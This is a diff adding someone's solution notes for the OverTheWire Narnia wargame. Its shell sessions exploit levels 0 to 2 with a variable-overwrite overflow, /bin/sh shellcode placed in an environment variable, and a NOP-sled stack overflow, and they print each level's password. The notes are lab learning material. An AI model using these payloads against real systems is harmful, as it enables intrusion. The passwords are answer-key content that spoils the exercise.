@@ -1,0 +1,44 @@
+=====================================================================
+                           
+                           NARNIA
+
+=====================================================================
+
+  Connection : ssh narnia0@narnia.labs.overthewire.org -p 2226
+
+  Download link : scp -r -P 2226 narnia0@narnia.labs.overthewire.org:/narnia/narnia0 /home/dsammmy/Desktop/Online_practice/OverTheWire/Narnia/narnia
+
+Narnia0 : narnia0
+ (
+   narnia0@narnia:/narnia$ (python -c "print'A'*20+'\xef\xbe\xad\xde'" & cat) | ./narnia0 
+   Correct val's value from 0x41414141 -> 0xdeadbeef!
+   Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
+   val: 0xdeadbeef
+   whoami
+   narnia1
+   cat /etc/narnia_pass/narnia1
+   efeidiedae
+ )
+Narnia1 : efeidiedae
+ (
+   shellcode : '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
+
+   narnia1@narnia:/narnia$ export "EGG"=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
+   narnia1@narnia:/narnia$ ./narnia1
+   Trying to execute EGG!
+   $ whoami
+   narnia2
+   $ cat /etc/narnia_pass/narnia2
+   nairiepecu
+ )
+ Narnia2 : nairiepecu
+  ( script -> narnia2.py 
+    narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xd8\xff\xff"')
+    $ whoami
+    narnia3
+    $ cat /etc/narnia_pass/narnia3
+    vaequeezee
+  )
+ Narnia3 : vaequeezee        <---  Intresting Question.
+  ( )
+ Narnia4 : thaenohtai
